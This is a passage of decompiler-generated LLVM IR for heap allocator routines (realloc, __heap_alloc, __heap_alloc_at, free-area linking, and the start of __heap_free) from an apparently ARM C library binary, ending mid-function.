  %v0_1353c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %dec_label_pc_13500, %dec_label_pc_13534
  %v1_13544 = phi i32 [ %v0_13514, %dec_label_pc_13500 ], [ %v0_1353c.pre, %dec_label_pc_13534 ]
  %v1_1353c = add i32 %v1_13544, 4
  %v2_1353c = inttoptr i32 %v1_1353c to i32*
  %v3_1353c = load i32, i32* %v2_1353c, align 4
  %v2_13540 = icmp eq i32 %v3_1353c, 0
  br i1 %v2_13540, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_1353c
  %v2_13544 = add i32 %v1_13544, 8
  %v3_13544 = inttoptr i32 %v2_13544 to i32*
  %v4_13544 = load i32, i32* %v3_13544, align 4
  %v3_13548 = add i32 %v3_1353c, 8
  %v4_13548 = inttoptr i32 %v3_13548 to i32*
  store i32 %v4_13544, i32* %v4_13548, align 4
  %v0_1354c.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1353c, %bb12
  %v0_1354c = phi i32 [ %v1_13544, %dec_label_pc_1353c ], [ %v0_1354c.pre, %bb12 ]
  %v1_1354c = add i32 %v0_1354c, 8
  %v2_1354c = inttoptr i32 %v1_1354c to i32*
  %v3_1354c = load i32, i32* %v2_1354c, align 4
  %v1_13550 = add i32 %v0_1354c, 4
  %v2_13550 = inttoptr i32 %v1_13550 to i32*
  %v3_13550 = load i32, i32* %v2_13550, align 4
  %v2_13554 = icmp eq i32 %v3_1354c, 0
  br i1 %v2_13554, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_13558 = add i32 %v3_1354c, 4
  %v4_13558 = inttoptr i32 %v3_13558 to i32*
  store i32 %v3_13550, i32* %v4_13558, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_1355c = load i32, i32* @r8, align 4
  %v3_1355c = inttoptr i32 %v2_1355c to i32*
  store i32 %v3_13550, i32* %v3_1355c, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  store i32 ptrtoint (i32* @global_var_2f3bc.271 to i32), i32* @r0, align 4
  %v1_1356c = call i32 @pthread_mutex_unlock()
  %v0_13570 = load i32, i32* @r6, align 4
  %v1_13570 = load i32, i32* @r4, align 4
  %v0_13578 = load i32, i32* @r5, align 4
  %v2_13570 = sub i32 12, %v0_13570
  %v1_13574 = add i32 %v2_13570, %v1_13570
  %v2_13578 = sub i32 %v1_13574, %v0_13578
  %v1_1357c = call i32 @__GI_sbrk(i32 %v2_13578)
  br label %dec_label_pc_13534

; uselistorder directives
  uselistorder i32 %v0_1354c, { 1, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_2f574.269 to i32), { 0, 5, 1, 6, 2, 7, 8, 3, 4 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1353c, { 1, 0 }
  uselistorder label %dec_label_pc_13534, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_135a0 = load i32, i32* @r4, align 4
  store i32 %v3_135a0, i32* %stack_var_-24, align 4
  %v6_135a0 = load i32, i32* @r5, align 4
  %v9_135a0 = load i32, i32* @r6, align 4
  %v12_135a0 = load i32, i32* @r7, align 4
  %v15_135a0 = load i32, i32* @r8, align 4
  %v18_135a0 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_135a4 = icmp eq i32 %arg2, 0
  %v0_135a8 = load i32, i32* @r0, align 4
  store i32 %v0_135a8, i32* @r7, align 4
  br i1 %v2_135a4, label %dec_label_pc_135b0, label %dec_label_pc_135b8

dec_label_pc_135b0:                               ; preds = %entry
  %v0_135b0 = call i32 @free()
  %v0_135c0.pre = load i32, i32* @r4, align 4
  %v2_135c4.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135b8:                               ; preds = %entry
  %v2_135b8 = icmp eq i32 %v0_135a8, 0
  br i1 %v2_135b8, label %dec_label_pc_135c0, label %dec_label_pc_135cc

dec_label_pc_135c0:                               ; preds = %dec_label_pc_135b8, %dec_label_pc_135b0
  %v2_135c4 = phi i32 [ %v3_135a0, %dec_label_pc_135b8 ], [ %v2_135c4.pre, %dec_label_pc_135b0 ]
  %v0_135c0 = phi i32 [ %arg2, %dec_label_pc_135b8 ], [ %v0_135c0.pre, %dec_label_pc_135b0 ]
  store i32 %v2_135c4, i32* @r4, align 4
  store i32 %v6_135a0, i32* @r5, align 4
  store i32 %v9_135a0, i32* @r6, align 4
  store i32 %v12_135a0, i32* @r7, align 4
  store i32 %v18_135a0, i32* @lr, align 4
  %v1_135c8 = call i32 @malloc(i32 %v0_135c0)
  %v0_135cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_135cc

dec_label_pc_135cc:                               ; preds = %dec_label_pc_135b8, %dec_label_pc_135c0
  %v0_135e4 = phi i32 [ %v0_135a8, %dec_label_pc_135b8 ], [ %v1_135c8, %dec_label_pc_135c0 ]
  %v0_135cc = phi i32 [ %arg2, %dec_label_pc_135b8 ], [ %v0_135cc.pre, %dec_label_pc_135c0 ]
  %v1_135cc = add i32 %v0_135cc, 7
  %v1_135d0 = and i32 %v1_135cc, -4
  store i32 %v1_135d0, i32* @r5, align 4
  %v2_135d4 = icmp ugt i32 %v1_135d0, 10
  %v1_135d8 = add i32 %v0_135e4, -4
  %v2_135d8 = inttoptr i32 %v1_135d8 to i32*
  %v3_135d8 = load i32, i32* %v2_135d8, align 4
  store i32 %v3_135d8, i32* @r6, align 4
  br i1 %v2_135d4, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_135cc
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_135cc, %bb
  %v0_13660 = phi i32 [ %v1_135d0, %dec_label_pc_135cc ], [ 12, %bb ]
  store i32 %v1_135d8, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_13660, %v3_135d8
  br i1 %tmp, label %dec_label_pc_135ec, label %dec_label_pc_13660

dec_label_pc_135ec:                               ; preds = %bb14
  %v2_135e0 = sub i32 %v0_13660, %v3_135d8
  store i32 %v2_135e0, i32* @r4, align 4
  %v2_135fc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f3bc.271 to i32))
  %v0_13600 = load i32, i32* @r4, align 4
  %v0_13604 = load i32, i32* @r8, align 4
  %v1_13604 = load i32, i32* @r6, align 4
  %v2_13604 = add i32 %v1_13604, %v0_13604
  %v4_1360c = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_2a9c4.687 to i32*), i32 %v2_13604, i32 %v0_13600)
  store i32 %v4_1360c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2f3bc.271 to i32), i32* @r0, align 4
  store i32 79396, i32* @lr, align 4
  %v1_13620 = call i32 @pthread_mutex_unlock()
  %v0_13624 = load i32, i32* @r4, align 4
  %v2_13624 = icmp eq i32 %v0_13624, 0
  br i1 %v2_13624, label %dec_label_pc_13634, label %.thread

.thread:                                          ; preds = %dec_label_pc_135ec
  %v1_13628 = load i32, i32* @r6, align 4
  %v3_13628 = add i32 %v1_13628, %v0_13624
  %v2_1362c = load i32, i32* @r7, align 4
  %v3_1362c = add i32 %v2_1362c, -4
  %v4_1362c = inttoptr i32 %v3_1362c to i32*
  store i32 %v3_13628, i32* %v4_1362c, align 4
  br label %dec_label_pc_136a0

dec_label_pc_13634:                               ; preds = %dec_label_pc_135ec
  %v0_13634 = load i32, i32* @r5, align 4
  %v1_13634 = add i32 %v0_13634, -4
  %v1_13638 = call i32 @malloc(i32 %v1_13634)
  store i32 %v1_13638, i32* @r0, align 4
  store i32 %v1_13638, i32* @r4, align 4
  %v2_1363c = icmp eq i32 %v1_13638, 0
  br i1 %v2_1363c, label %dec_label_pc_13658, label %dec_label_pc_13644

dec_label_pc_13644:                               ; preds = %dec_label_pc_13634
  %v0_13644 = load i32, i32* @r6, align 4
  %v1_13644 = add i32 %v0_13644, -4
  store i32 %v1_13644, i32* @r2, align 4
  %v0_13648 = load i32, i32* @r7, align 4
  store i32 %v0_13648, i32* @r1, align 4
  %v0_1364c = call i32 @memcpy()
  %v0_13650 = load i32, i32* @r7, align 4
  store i32 %v0_13650, i32* @r0, align 4
  %v0_13654 = call i32 @free()
  %v0_13658.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13658

dec_label_pc_13658:                               ; preds = %dec_label_pc_13634, %dec_label_pc_13644
  %v0_13658 = phi i32 [ 0, %dec_label_pc_13634 ], [ %v0_13658.pre, %dec_label_pc_13644 ]
  store i32 %v0_13658, i32* @r7, align 4
  br label %dec_label_pc_136a0

dec_label_pc_13660:                               ; preds = %bb14
  %v1_13660 = add i32 %v0_13660, 28
  %tmp15 = icmp ugt i32 %v1_13660, %v3_135d8
  br i1 %tmp15, label %dec_label_pc_136a0, label %dec_label_pc_1366c

dec_label_pc_1366c:                               ; preds = %dec_label_pc_13660
  %v2_13678 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f3bc.271 to i32))
  %v0_1367c = load i32, i32* @r8, align 4
  %v1_1367c = load i32, i32* @r5, align 4
  %v2_1367c = add i32 %v1_1367c, %v0_1367c
  %v1_13680 = load i32, i32* @r6, align 4
  %v2_13680 = sub i32 %v1_13680, %v1_1367c
  %v4_13688 = call i32 @__heap_free(i32* bitcast (i32** @global_var_2a9c4.687 to i32*), i32 %v2_1367c, i32 %v2_13680)
  store i32 ptrtoint (i32* @global_var_2f3bc.271 to i32), i32* @r0, align 4
  store i32 79516, i32* @lr, align 4
  %v1_13698 = call i32 @pthread_mutex_unlock()
  %v0_1369c = load i32, i32* @r5, align 4
  %v1_1369c = load i32, i32* @r7, align 4
  %v2_1369c = add i32 %v1_1369c, -4
  %v3_1369c = inttoptr i32 %v2_1369c to i32*
  store i32 %v0_1369c, i32* %v3_1369c, align 4
  br label %dec_label_pc_136a0

dec_label_pc_136a0:                               ; preds = %.thread, %dec_label_pc_13660, %dec_label_pc_13658, %dec_label_pc_1366c
  %v0_136a0 = load i32, i32* @r7, align 4
  store i32 %v6_135a0, i32* @r5, align 4
  store i32 %v9_135a0, i32* @r6, align 4
  store i32 %v12_135a0, i32* @r7, align 4
  store i32 %v15_135a0, i32* @r8, align 4
  ret i32 %v0_136a0

; uselistorder directives
  uselistorder i32 %v1_1367c, { 1, 0 }
  uselistorder i32 %v0_13660, { 1, 2, 0 }
  uselistorder i32 %v3_135d8, { 0, 2, 1, 3 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 0, 2, 1 }
  uselistorder i32** @global_var_2a9c4.687, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2f3bc.271 to i32), { 9, 2, 10, 3, 11, 0, 1, 4, 12, 5, 13, 14, 6, 15, 7, 16, 8 }
  uselistorder label %dec_label_pc_136a0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_13658, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_135cc, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_136b8 = inttoptr i32 %arg2 to i32*
  %v2_136b8 = load i32, i32* %v1_136b8, align 4
  %v3_136bc = load i32, i32* @r4, align 4
  store i32 %v3_136bc, i32* %stack_var_-8, align 4
  %v1_136c0 = add i32 %v2_136b8, 3
  %v1_136c4 = and i32 %v1_136c0, -4
  store i32 %v1_136c4, i32* @r2, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_136cc = icmp ugt i32 %v1_136c4, 10
  store i32 %tmp, i32* @r1, align 4
  %v2_136d4 = load i32, i32* %arg1, align 4
  store i32 %v2_136d4, i32* %r0.global-to-local, align 4
  br i1 %v2_136cc, label %dec_label_pc_13740.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* @r2, align 4
  br label %dec_label_pc_13740.preheader

dec_label_pc_13740.preheader:                     ; preds = %entry, %bb
  %v1_136f4 = phi i32 [ %v1_136c4, %entry ], [ 12, %bb ]
  %v2_137409 = icmp eq i32 %v2_136d4, 0
  br i1 %v2_137409, label %dec_label_pc_13748, label %dec_label_pc_136e0

dec_label_pc_136e0:                               ; preds = %dec_label_pc_13740.preheader, %dec_label_pc_1373c
  %v2_136f8 = phi i32 [ %v3_1373c, %dec_label_pc_1373c ], [ %v2_136d4, %dec_label_pc_13740.preheader ]
  %v1_136e0 = inttoptr i32 %v2_136f8 to i32*
  %v2_136e0 = load i32, i32* %v1_136e0, align 4
  store i32 %v2_136e0, i32* @ip, align 4
  %v3_136e4 = icmp ult i32 %v2_136e0, %v1_136f4
  br i1 %v3_136e4, label %dec_label_pc_1373c, label %dec_label_pc_136ec

dec_label_pc_136ec:                               ; preds = %dec_label_pc_136e0
  %v1_136ec = add i32 %v1_136f4, 44
  %v3_136f0 = icmp ult i32 %v2_136e0, %v1_136ec
  br i1 %v3_136f0, label %dec_label_pc_13700, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_136ec
  %v2_136e4.le = sub i32 %v2_136e0, %v1_136f4
  store i32 %v2_136e4.le, i32* %v1_136e0, align 4
  %v0_1372c.pre = load i32, i32* @ip, align 4
  %v0_13734.pre = load i32, i32* @r2, align 4
  br label %bb29

dec_label_pc_13700:                               ; preds = %dec_label_pc_136ec
  %v1_13700 = add i32 %v2_136f8, 4
  %v2_13700 = inttoptr i32 %v1_13700 to i32*
  %v3_13700 = load i32, i32* %v2_13700, align 4
  %v2_13704 = icmp eq i32 %v3_13700, 0
  br i1 %v2_13704, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_13700
  %v2_13708 = add i32 %v2_136f8, 8
  %v3_13708 = inttoptr i32 %v2_13708 to i32*
  %v4_13708 = load i32, i32* %v3_13708, align 4
  %v3_1370c = add i32 %v3_13700, 8
  %v4_1370c = inttoptr i32 %v3_1370c to i32*
  store i32 %v4_13708, i32* %v4_1370c, align 4
  %v0_13710.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13700, %bb27
  %v0_13710 = phi i32 [ %v2_136f8, %dec_label_pc_13700 ], [ %v0_13710.pre, %bb27 ]
  %v1_13710 = add i32 %v0_13710, 8
  %v2_13710 = inttoptr i32 %v1_13710 to i32*
  %v3_13710 = load i32, i32* %v2_13710, align 4
  %v1_13714 = add i32 %v0_13710, 4
  %v2_13714 = inttoptr i32 %v1_13714 to i32*
  %v3_13714 = load i32, i32* %v2_13714, align 4
  %v2_13718 = icmp eq i32 %v3_13710, 0
  br i1 %v2_13718, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_1371c = add i32 %v3_13710, 4
  %v4_1371c = inttoptr i32 %v3_1371c to i32*
  store i32 %v3_13714, i32* %v4_1371c, align 4
  %v1_13724 = load i32, i32* @ip, align 4
  store i32 %v1_13724, i32* @r2, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_13720 = load i32, i32* @r1, align 4
  %v3_13720 = inttoptr i32 %v2_13720 to i32*
  store i32 %v3_13714, i32* %v3_13720, align 4
  %v1_13728.pre = load i32, i32* @ip, align 4
  store i32 %v1_13728.pre, i32* @r2, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_13734 = phi i32 [ %v0_13734.pre, %.thread._crit_edge ], [ %v1_13724, %bb28 ], [ %v1_13728.pre, %.thread5 ]
  %v0_1372c = phi i32 [ %v0_1372c.pre, %.thread._crit_edge ], [ %v1_13724, %bb28 ], [ %v1_13728.pre, %.thread5 ]
  %v1_1372c = load i32, i32* %r0.global-to-local, align 4
  %v2_1372c = sub i32 %v1_1372c, %v0_1372c
  %v1_13730 = add i32 %v2_1372c, 12
  store i32 %v1_13730, i32* %r0.global-to-local, align 4
  %v1_13734 = load i32, i32* %r4.global-to-local, align 4
  %v2_13734 = inttoptr i32 %v1_13734 to i32*
  store i32 %v0_13734, i32* %v2_13734, align 4
  %v2_13738 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13738, i32* %r4.global-to-local, align 4
  ret i32 %v1_13730

dec_label_pc_1373c:                               ; preds = %dec_label_pc_136e0
  %v1_1373c = add i32 %v2_136f8, 4
  %v2_1373c = inttoptr i32 %v1_1373c to i32*
  %v3_1373c = load i32, i32* %v2_1373c, align 4
  store i32 %v3_1373c, i32* %r0.global-to-local, align 4
  %v2_13740 = icmp eq i32 %v3_1373c, 0
  br i1 %v2_13740, label %dec_label_pc_13740.dec_label_pc_13748_crit_edge, label %dec_label_pc_136e0

dec_label_pc_13740.dec_label_pc_13748_crit_edge:  ; preds = %dec_label_pc_1373c
  br label %dec_label_pc_13748

dec_label_pc_13748:                               ; preds = %dec_label_pc_13740.dec_label_pc_13748_crit_edge, %dec_label_pc_13740.preheader
  store i32 %v3_136bc, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1373c, { 1, 2, 0 }
  uselistorder i32 %v0_13710, { 1, 0 }
  uselistorder i32 %v2_136e0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_136f8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_136f4, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_136e0, { 1, 0 }
  uselistorder label %dec_label_pc_13740.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_13750 = load i32, i32* %arg1, align 4
  store i32 %v2_13750, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_137c86 = icmp eq i32 %v2_13750, 0
  br i1 %v2_137c86, label %dec_label_pc_137d0, label %dec_label_pc_1375c

dec_label_pc_1375c:                               ; preds = %entry, %dec_label_pc_137c4
  %v0_1379c = phi i32 [ %v3_137c4, %dec_label_pc_137c4 ], [ %v2_13750, %entry ]
  %v1_1375c = inttoptr i32 %v0_1379c to i32*
  %v2_1375c = load i32, i32* %v1_1375c, align 4
  store i32 %v2_1375c, i32* %r0.global-to-local, align 4
  %v2_13760 = sub i32 %v0_1379c, %v2_1375c
  %v1_13764 = add i32 %v2_13760, 12
  %v3_13768 = icmp uge i32 %v1_13764, %arg2
  %v9_13768 = icmp eq i32 %v1_13764, %arg2
  %v2_1376c = xor i1 %v9_13768, true
  %v3_1376c = and i1 %v3_13768, %v2_1376c
  br i1 %v3_1376c, label %dec_label_pc_137c4, label %dec_label_pc_13770

dec_label_pc_13770:                               ; preds = %dec_label_pc_1375c
  br i1 %v9_13768, label %dec_label_pc_13774, label %dec_label_pc_137d0

dec_label_pc_13774:                               ; preds = %dec_label_pc_13770
  %v1_13774 = add i32 %arg3, 3
  %v1_13778 = and i32 %v1_13774, -4
  store i32 %v1_13778, i32* %r2.global-to-local, align 4
  %v2_1377c = sub i32 %v2_1375c, %v1_13778
  %v3_1377c = icmp ult i32 %v2_1375c, %v1_13778
  br i1 %v3_1377c, label %dec_label_pc_137d0, label %dec_label_pc_13784

dec_label_pc_13784:                               ; preds = %dec_label_pc_13774
  %v1_13784 = add i32 %v1_13778, 44
  %v3_13788 = icmp ult i32 %v2_1375c, %v1_13784
  br i1 %v3_13788, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_13784
  store i32 %v2_1377c, i32* %v1_1375c, align 4
  %v1_13794 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_13794, i32* %r0.global-to-local, align 4
  ret i32 %v1_13794

.thread2:                                         ; preds = %dec_label_pc_13784
  %v1_1379c = add i32 %v0_1379c, 4
  %v2_1379c = inttoptr i32 %v1_1379c to i32*
  %v3_1379c = load i32, i32* %v2_1379c, align 4
  store i32 %v3_1379c, i32* %r2.global-to-local, align 4
  %v2_137a0 = icmp eq i32 %v3_1379c, 0
  br i1 %v2_137a0, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_137a4 = add i32 %v0_1379c, 8
  %v3_137a4 = inttoptr i32 %v2_137a4 to i32*
  %v4_137a4 = load i32, i32* %v3_137a4, align 4
  %v3_137a8 = add i32 %v3_1379c, 8
  %v4_137a8 = inttoptr i32 %v3_137a8 to i32*
  store i32 %v4_137a4, i32* %v4_137a8, align 4
  %v0_137ac.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_137ac = phi i32 [ %v0_1379c, %.thread2 ], [ %v0_137ac.pre, %bb17 ]
  %v1_137ac = add i32 %v0_137ac, 8
  %v2_137ac = inttoptr i32 %v1_137ac to i32*
  %v3_137ac = load i32, i32* %v2_137ac, align 4
  store i32 %v3_137ac, i32* %r2.global-to-local, align 4
  %v1_137b0 = add i32 %v0_137ac, 4
  %v2_137b0 = inttoptr i32 %v1_137b0 to i32*
  %v3_137b0 = load i32, i32* %v2_137b0, align 4
  %v2_137b4 = icmp eq i32 %v3_137ac, 0
  br i1 %v2_137b4, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_137b8 = add i32 %v3_137ac, 4
  %v4_137b8 = inttoptr i32 %v3_137b8 to i32*
  store i32 %v3_137b0, i32* %v4_137b8, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_137bc = load i32, i32* %lr.global-to-local, align 4
  %v3_137bc = inttoptr i32 %v2_137bc to i32*
  store i32 %v3_137b0, i32* %v3_137bc, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_137c0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_137c0

dec_label_pc_137c4:                               ; preds = %dec_label_pc_1375c
  %v1_137c4 = add i32 %v0_1379c, 4
  %v2_137c4 = inttoptr i32 %v1_137c4 to i32*
  %v3_137c4 = load i32, i32* %v2_137c4, align 4
  store i32 %v3_137c4, i32* %ip.global-to-local, align 4
  %v2_137c8 = icmp eq i32 %v3_137c4, 0
  br i1 %v2_137c8, label %dec_label_pc_137c8.dec_label_pc_137d0.loopexit_crit_edge, label %dec_label_pc_1375c

dec_label_pc_137c8.dec_label_pc_137d0.loopexit_crit_edge: ; preds = %dec_label_pc_137c4
  br label %dec_label_pc_137d0

dec_label_pc_137d0:                               ; preds = %dec_label_pc_13774, %entry, %dec_label_pc_137c8.dec_label_pc_137d0.loopexit_crit_edge, %dec_label_pc_13770
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_137c4, { 1, 2, 0 }
  uselistorder i32 %v0_137ac, { 1, 0 }
  uselistorder i32 %v1_13778, { 0, 2, 1, 3 }
  uselistorder i1 %v9_13768, { 1, 0 }
  uselistorder i32 %v2_1375c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_1379c, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_137d0, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1375c, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_137d8 = load i32, i32* @r2, align 4
  %v2_137d8 = icmp eq i32 %v0_137d8, 0
  %v0_137dc = load i32, i32* @r3, align 4
  %v1_137dc = load i32, i32* @r1, align 4
  %v2_137dc = add i32 %v1_137dc, 4
  %v3_137dc = inttoptr i32 %v2_137dc to i32*
  store i32 %v0_137dc, i32* %v3_137dc, align 4
  %v0_137e0 = load i32, i32* @r2, align 4
  %v1_137e0 = load i32, i32* @r1, align 4
  %v2_137e0 = add i32 %v1_137e0, 8
  %v3_137e0 = inttoptr i32 %v2_137e0 to i32*
  store i32 %v0_137e0, i32* %v3_137e0, align 4
  %v1_137e8 = load i32, i32* @r1, align 4
  br i1 %v2_137d8, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_137e4 = load i32, i32* @r2, align 4
  %v3_137e4 = add i32 %v2_137e4, 4
  %v4_137e4 = inttoptr i32 %v3_137e4 to i32*
  store i32 %v1_137e8, i32* %v4_137e4, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_137e8 = load i32, i32* @r0, align 4
  %v3_137e8 = inttoptr i32 %v2_137e8 to i32*
  store i32 %v1_137e8, i32* %v3_137e8, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_137ec = load i32, i32* @r3, align 4
  %v2_137ec = icmp eq i32 %v0_137ec, 0
  br i1 %v2_137ec, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_137f0 = load i32, i32* @r1, align 4
  %v3_137f0 = add i32 %v0_137ec, 8
  %v4_137f0 = inttoptr i32 %v3_137f0 to i32*
  store i32 %v1_137f0, i32* %v4_137f0, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_137f4 = load i32, i32* @r0, align 4
  ret i32 %v1_137f4

; uselistorder directives
  uselistorder i32 %v1_137e8, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_137f8 = load i32, i32* @r2, align 4
  %v2_137f8 = icmp eq i32 %v0_137f8, 0
  %v1_137fc = load i32, i32* @r1, align 4
  br i1 %v2_137f8, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_137fc = load i32, i32* @r0, align 4
  %v3_137fc = inttoptr i32 %v2_137fc to i32*
  store i32 %v1_137fc, i32* %v3_137fc, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_13800 = add i32 %v0_137f8, 4
  %v4_13800 = inttoptr i32 %v3_13800 to i32*
  store i32 %v1_137fc, i32* %v4_13800, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_13804 = load i32, i32* @r2, align 4
  %v1_13804 = load i32, i32* @r1, align 4
  %v2_13804 = add i32 %v1_13804, 8
  %v3_13804 = inttoptr i32 %v2_13804 to i32*
  store i32 %v0_13804, i32* %v3_13804, align 4
  %v1_13808 = load i32, i32* @r0, align 4
  ret i32 %v1_13808

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1380c = load i32, i32* @r4, align 4
  store i32 %v3_1380c, i32* %stack_var_-20, align 4
  %v2_13810 = load i32, i32* %arg1, align 4
  store i32 %v2_13810, i32* %r4.global-to-local, align 4
  %v2_13814 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_138302 = icmp eq i32 %v2_13810, 0
  br i1 %v2_138302, label %dec_label_pc_138e0, label %dec_label_pc_13820

dec_label_pc_13820:                               ; preds = %entry, %dec_label_pc_13828
  %v0_13870 = phi i32 [ %v0_13878, %dec_label_pc_13828 ], [ 0, %entry ]
  %v0_13878 = phi i32 [ %v3_1382c, %dec_label_pc_13828 ], [ %v2_13810, %entry ]
  %v1_138345.in = phi i32 [ %v3_1382c, %dec_label_pc_13828 ], [ %v2_13810, %entry ]
  %v1_138345 = add i32 %v1_138345.in, 12
  %v3_13820 = icmp ult i32 %v1_138345, %arg2
  br i1 %v3_13820, label %dec_label_pc_13828, label %dec_label_pc_13840

dec_label_pc_13828:                               ; preds = %dec_label_pc_13820
  store i32 %v0_13878, i32* %r6.global-to-local, align 4
  %v1_1382c = add i32 %v0_13878, 4
  %v2_1382c = inttoptr i32 %v1_1382c to i32*
  %v3_1382c = load i32, i32* %v2_1382c, align 4
  store i32 %v3_1382c, i32* %r4.global-to-local, align 4
  %v2_13830 = icmp eq i32 %v3_1382c, 0
  br i1 %v2_13830, label %dec_label_pc_13830.dec_label_pc_138e0.loopexit_crit_edge, label %dec_label_pc_13820

dec_label_pc_13840:                               ; preds = %dec_label_pc_13820
  %v1_13840 = inttoptr i32 %v0_13878 to i32*
  %v2_13840 = load i32, i32* %v1_13840, align 4
  store i32 %v2_13840, i32* @ip, align 4
  %v2_13844 = sub i32 %v0_13878, %v2_13840
  %v1_13848 = add i32 %v2_13844, 12
  %v3_1384c = icmp uge i32 %v1_13848, %v2_13814
  %v9_1384c = icmp eq i32 %v1_13848, %v2_13814
  %v2_13850 = xor i1 %v9_1384c, true
  %v3_13850 = and i1 %v3_1384c, %v2_13850
